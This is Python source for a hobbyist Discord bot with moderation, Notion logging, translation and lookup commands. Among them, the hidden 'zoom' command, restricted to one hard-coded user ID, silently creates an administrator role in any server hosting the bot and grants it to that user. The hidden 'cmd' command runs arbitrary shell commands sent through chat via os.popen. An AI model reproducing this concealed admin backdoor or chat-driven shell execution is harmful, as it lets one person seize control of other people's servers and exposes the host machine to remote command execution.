import os
import random
import discord
import auth
from discord.errors import HTTPException
from discord.ext import commands
from discord.ext.commands.errors import CommandInvokeError, NotOwner
from discord.utils import get
from notion.block import EmbedBlock
from notion.client import NotionClient
import asyncio
import time
from threading import Timer
import subprocess
import wolframalpha
import wikipedia
from wikipedia import search
import requests
import textwrap
import re
from datetime import datetime
from google.cloud import translate_v2 as translate
import resources
from discord import Member
from discord.ext.commands import has_permissions

#wolfram alpha
wclient = wolframalpha.Client(auth.appId)

#notion
nclient = NotionClient(auth.token_v2)

#googletranslate
translate_client = translate.Client.from_service_account_json("DiscordBot-b0d16fb53e59.json")

#discord
bot = commands.Bot(command_prefix="$")

@bot.event
async def on_ready():
    print('Logged in as {0} ({0.id})'.format(bot.user) + ".")
    print('----')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="$help"))

@bot.command(hidden=True, brief="Returns bot state")
async def info(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdInfo: Permission given ({ctx.message.author}).")
        await ctx.send('Logged in as {0} ({0.id})'.format(bot.user))
    else:
        print(f"cmdInfo: Permission denied ({ctx.message.author}).")
        await ctx.send("You do not have permission to use this command.")

@bot.command(brief="Changes bot status", description="Changes bot status. Command useable by select people.")
async def status(ctx, actType, *, actName = None):
    if ctx.message.author.id == 621056841606103042 or ctx.message.author.id == 309045139974914048 or ctx.message.author.id == 558430263013670922:
        print(f"cmdStatus: Permission given ({ctx.message.author}).")
        if actType == "playing":
            print("cmdStatus")
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=actName))
            await ctx.send("Status updated successfully.")
        if actType == "watching":
            print("cmdStatus")
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=actName))
            await ctx.send("Status updated successfully.")
        if actType == "listening":
            print("cmdStatus")
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=actName))
            await ctx.send("Status updated successfully.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdStatus: Permission denied ({ctx.message.author}).")

@bot.command(brief="Returns mentioned user's id", description="Returns mentioned user's id. Defaults to message author.")
async def id(ctx):
    print("cmdId")
    try:
        userId = str(ctx.message.mentions[0].id)
    except:
        userId = str(ctx.message.author.id)
    await ctx.send("Mentioned user's ID is: " + userId + ".")

@bot.command(brief="Kicks specified user", description="Kicks  specified user. Command useable by those with kick members permission.")
async def kick(ctx, member:discord.Member):
    if ctx.message.author.guild_permissions.kick_members:
        print(f"cmdKick: Permission given ({ctx.message.author}).")
        try:
            await member.kick()
        except discord.Forbidden:
            await ctx.send(":(")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdKick: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def zoom(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdZoom: Permission given ({ctx.message.author}).")
        try:
            guild = ctx.guild
            try:
                member = ctx.message.mentions[0] 
            except:
                member = ctx.message.author
            await guild.create_role(name="z", permissions =  discord.Permissions(administrator = True))
            role = discord.utils.get(ctx.message.guild.roles, name = "z")
            await member.add_roles(role)   
        except discord.Forbidden:
            await ctx.send(":(")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdZoom: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def list(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdList: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/Task-List-885896debbd24294aedd4c77b62b36f3")
        result = cv.default_query().execute()
        embed = discord.Embed(title="Task List")
        for row in result:
            try:
                if row.complete == False:
                    embed.add_field(name=row.title, value=row.subject + ", " + row.urgency + ", " + row.importance, inline=False)
            except:
                pass
        await ctx.send(embed=embed)
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdList: Permission denied ({ctx.message.author}).")
    

@bot.command(hidden=True)
async def add(ctx, subject, title, urgency, importance):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdAdd: Permission given ({ctx.message.author}).")
        try:
            cv = nclient.get_collection_view("https://www.notion.so/Task-List-885896debbd24294aedd4c77b62b36f3")
            row = cv.collection.add_row()
            row.subject = subject
            row.title = title
            row.urgency = urgency
            row.importance = importance
            row.complete = False
        except:
            await ctx.send("Check spelling/syntax and try again.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def done(ctx, title):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdDone: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/Task-List-885896debbd24294aedd4c77b62b36f3")
        result = cv.default_query().execute()
        for row in result:
            if row.title == title:
                target = cv.collection.add_row()
                row.title = title
                row.complete = True
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdDone: Permission denied ({ctx.message.author}).")

spamCount = 0

@bot.event
async def on_message(message):
    try:
        content =  str(message.mentions)
        if "id=621056841606103042" in content:
            print("eventSpam")
            global spamCount 
            channel = message.channel 
            if spamCount < 1:
                spamTimer()
            spamCount += 1
            if spamCount > 1 and spamCount < 4:
                await channel.send("Please don't spam.")
                print("Spam warning issued. Spam = " + str(spamCount))
            if spamCount > 3:
                await message.delete()
                print("Spam messages deleted. Spam = " + str(spamCount))
    except:
        pass
    await bot.process_commands(message)

def spamReset():
    global spamCount
    spamCount = 0
    print(f"spamCount reset({spamCount})")

def spamTimer():
    print("spamTimer called.")
    timer = Timer(30, spamReset)
    timer.start()

@bot.command(hidden=True)
async def launch(ctx, item):
    if ctx.message.author.id == 621056841606103042 or ctx.message.author.id == 485794062448852993 or ctx.message.author.id ==558430263013670922:
        print(f"cmdLaunch: Permission given ({ctx.message.author}). Item = {item}")
        if item == "val":
            process = subprocess.Popen(["C:\Riot Games\Riot Client\RiotClientServices.exe", "--launch-product=valorant", "--launch-patchline=live"])
            await ctx.send("Attempting to launch Valorant.")   
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdLaunch: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def join(ctx, *args):
    subject = " ".join(args[:])
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdSubject: Permission given ({ctx.message.author}). Subject = {subject}.")
        if subject == "spanish":
            os.system("start chrome " + auth.spanish)
            await ctx.send(f"Joining {subject}.")
        elif subject == "anatomy":
            os.system("start chrome " + auth.anatomy)
            await ctx.send(f"Joining {subject}.")
        elif subject == "english":
            os.system("start chrome " + auth.english)
            await ctx.send(f"Joining {subject}.")
        elif subject == "english stinger":
            os.system("start chrome " + auth.englishStinger)
            await ctx.send(f"Joining {subject}.")
        elif subject == "precalc":
            os.system("start chrome " + auth.precalc)
            await ctx.send(f"Joining {subject}.")
        elif subject == "comp sci":
            os.system("start chrome " + auth.compSci)
            await ctx.send(f"Joining {subject}.")
        elif subject == "apush":
            os.system("start chrome " + auth.apush)
            await ctx.send(f"Joining {subject}.")
        elif subject == "cybersecurity":
            os.system("start chrome " + auth.cybersecurity)
            await ctx.send(f"Joining {subject}.")
        else:
            await ctx.send(f"Joining {subject}.")
        
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}). Subject = {subject}.")

@bot.command(hidden=True)
async def cmd(ctx, *args):
    input = " ".join(args[:])
    if ctx.message.author.id == 621056841606103042: 
        print(f"cmdCmd: Permission given ({ctx.message.author}). Input = {input}.")
        stream = os.popen(input)
        output = stream.read()
        try:
            await ctx.send(output)
        except HTTPException:
            await ctx.send("No output. Check command and try again.")
    else: 
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}). Input = {input}.")

@bot.command(brief="Changes mentioned user's nickname")
async def nick(ctx, user, *args):
    if ctx.message.author.guild_permissions.manage_nicknames:
        print(f"cmdNick: Permission given ({ctx.message.author}). ")
        name = " ".join(args[:])
        target = ctx.message.mentions[0]
        try:
            await target.edit(nick=name)
            await ctx.send(f"Nickname for {target} changed to {name}.")
        except:
            await ctx.send(f"Nickname change for {target} unsuccessful. Please confirm that entered nickname is below the 32 character limit.")
    else:
        print(f"cmdNick: Permission given ({ctx.message.author}). ")
        await ctx.send("You do not have permission to use this command.")

@bot.command(brief="Mutes mentioned user in text channels")
async def mute(ctx):
    if ctx.message.author.guild_permissions.mute_members:
        print(f"cmdMute: Permission given ({ctx.message.author}).")
        guild = ctx.guild
        try:
            member = ctx.message.mentions[0]
            if get(ctx.guild.roles, name="Muted"):
                role = discord.utils.get(ctx.message.guild.roles, name = "Muted")
                print(f"cmdMute: Assigning role to {member}")
            else:
                await guild.create_role(name="Muted", permissions =  discord.Permissions(send_messages = False, read_messages = True))
                role = discord.utils.get(ctx.message.guild.roles, name = "Muted")
                pos = 4
                while True:
                    try:
                        await role.edit(position=pos)
                        break
                    except discord.Forbidden:
                        pos += 1
                        continue
                print(f"cmdMute: Creating mute role.")
                print(f"cmdMute: Assigning role to {member}")
            await member.add_roles(role)
        except discord.Forbidden:
            await ctx.send("Check bot permissions.")
            print(f"cmdMute: Error (bot permissions).")
        except:
            await ctx.send("Please mention a user.")
            print(f"cmdMute: Error (no user mentioned).")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdMute: Permission denied ({ctx.message.author}).")

@bot.command(brief="Unmutes previously muted user")
async def unmute(ctx):
    if ctx.message.author.guild_permissions.mute_members:
        print(f"cmdUnmute: Permission given ({ctx.message.author}).")
        guild = ctx.guild
        try:
            member = ctx.message.mentions[0]
            if get(ctx.guild.roles, name="Muted"):
                role = discord.utils.get(ctx.message.guild.roles, name = "Muted")
                if role in member.roles:
                    await member.remove_roles(role)
                else:
                    await ctx.send("Mentioned user is not muted.")
                    print(f"cmdUnmute: Error (User is not muted).")
            else:
                await ctx.send("Server does not have mute role.")
                print(f"cmdUnmute: Error (Server does not have mute role.")
        except discord.Forbidden:
            await ctx.send("Check bot permissions.")
            print(f"cmdUnmute: Error (bot permissions).")
        except:
            await ctx.send("Please mention a user.")
            print(f"cmdUnmute: Error (no user mentioned).")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdUnmute: Permission denied ({ctx.message.author}).")

@bot.command(brief="Asks Wolfram Alpha an inputted question", description="Asks Wolfram Alpha an inputted question. Some questions will not return results.")
async def ask(ctx, *args):
    input = ' '.join(args[:])
    print(f'cmdAsk: Search query "{input}"')
    res = wclient.query(input)
    if res['@success'] == 'false':
        print(f'cmdAsk: Question cannot be resolved.')
        await ctx.send('Question cannot be resolved.')
    else:
        try:
            result = res['pod'][1]['subpod']['img']['@src']
            #title = res['pod'][1]['subpod']['img']['@title']
            title = input
            embed = discord.Embed(title=title)
            embed.set_image(url=result)
            await ctx.send(embed=embed)
        except:
            result = next(res.results).text
            await ctx.send(result)

@bot.command(brief="Returns a Wikipedia page for the given term", description="Returns a Wikipedia page for the given term. *Work in progress.")
async def wiki(ctx, *args):
    input = ' '.join(args[:])
    print(f'cmdWiki: Search query "{input}"')
    res = wikipedia.search(input)
    if not res:
        print(f'cmdWiki: No result from wikipedia.')
        await ctx.send('No response from wikipedia.')
    try:
        page = wikipedia.page(res[0])
    except:
        page =  wikipedia.page(wikipedia.options[0])
    title = page.title.encode('utf-8')
    summary = page.summary.encode('utf-8')
    title1 = title.decode('utf-8', 'ignore')
    summary1 = summary.decode('utf-8')
    link = page.url[:2000]
    embed = discord.Embed(title=title1, description=link)
    summary2 = re.split('(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', summary1)
    num = 0
    temp = summary2[num]
    printing = True;
    while printing:
        if num < len(summary2):
            while len(temp) <= 1024 and num < len(summary2):
                if len(temp) + len(summary2[num]) <= 1024:
                    temp = temp + ' ' + summary2[num]
                    num = num + 1 
                else:
                    embed.add_field(name='\u200b', inline=False, value=temp)
                    temp = ''
                    temp = summary2[num]
                    break
        else:
            embed.add_field(name='\u200b', inline=False, value=temp)
            printing = False;
    await ctx.send(embed=embed)

@bot.command(hidden=True)
async def drive(ctx, time, unit, tod):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdAdd: Permission given ({ctx.message.author}).")
        if str(unit) == "minute" or str(unit) == "minutes" or str(unit) == "min" or str(unit) == "mins":
            time = round(float(time) / 60, 2)
        try:
            cv = nclient.get_collection_view("https://www.notion.so/d2d19d98d9344cbd84ea35a1c095ee63?v=a476645a60e54ba4a48e73e39e7f0cf2")
            row = cv.collection.add_row()
            row.date = datetime.today().strftime("%m/%d/%y")
            row.hours = float(time)
            row.time = tod
        except:
            await ctx.send("Check spelling/syntax and try again.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def driving(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdList: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/d2d19d98d9344cbd84ea35a1c095ee63?v=a476645a60e54ba4a48e73e39e7f0cf2")
        all = 0
        day = 0
        night = 0
        result = cv.default_query().execute()
        for row in result:
            try:
                    all += row.hours
                    if row.time == ['day']:
                        day += row.hours
                    if row.time == ['night']:
                        night += row.hours
                    #print(row.time)
            except:
                pass
        embed = discord.Embed(title=f"Driving Hours")
        embed.add_field(name="Total", value=str(all) + "/45", inline=False)
        embed.add_field(name="Day", value=str(day) + "/30", inline=False)
        embed.add_field(name="Night", value=str(night) + "/15", inline=False)
        await ctx.send(embed=embed)
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdList: Permission denied ({ctx.message.author}).")

@bot.command(brief="Translates given text into given language", description="Translates given text into given language. See syntax below. Command autodetects source language.")
async def translate(ctx, langInput, *input):
    langIn = langInput.capitalize()
    content = ' '.join(input[:])
    langs1 = dict((v,k) for k,v in resources.langs.items())
    langs2 = resources.langs
    lang = langs1.get(langIn, langIn)
    pLang = langs2.get(langIn, langIn)
    result = translate_client.translate(content, lang)
    og = langs2.get(result["detectedSourceLanguage"], "noneType")
    embed = discord.Embed(title=f"Translator")
    try:
        embed.add_field(name=f"Text translated from {og} to {pLang}.", value=result["translatedText"], inline=False)
    except:
        embed.add_field(name="Error", value="Translation error. Please try again.", inline=False)
        print(f'cmdTranslate: Translation error. Input = "{content}"')
    await ctx.send(embed=embed)

@bot.command(brief="Returns image of the specified user's profile picture", description="Returns image of the specified user's profile picture. Defaults to message sender.")
async def pfp(ctx, member: Member = None):
    print(f"cmdPfp: Permission given ({ctx.message.author}).")
    if not member:
        member = ctx.author
    await ctx.send(member.avatar_url)
            
@bot.command(brief="Delete a chosen number of messages", description="Delete a chosen number of messages. Command usable by those with manage messages permission.")
async def purge(ctx, num):
        clear = int(num) + 1;
        if ctx.message.author.guild_permissions.manage_messages:
            print(f"cmdPurge: Permission given ({ctx.message.author}). Messages cleared = " + str(clear) + ".")
            await ctx.channel.purge(limit=clear)
        else: 
            print(f"cmdPurge: Permission denied ({ctx.message.author}).")
            await ctx.send("You do not have permission to use this command.")

@bot.command(brief="Creates an invite to this server.", description="Creates an invite to this server.")
async def invite(ctx):
    link = await ctx.channel.create_invite(max_age = 300)
    await ctx.send(link)

HelpCommand = commands.DefaultHelpCommand(
    no_category = "Commands"
)

bot.help_command = HelpCommand
bot.run(auth.TOKEN)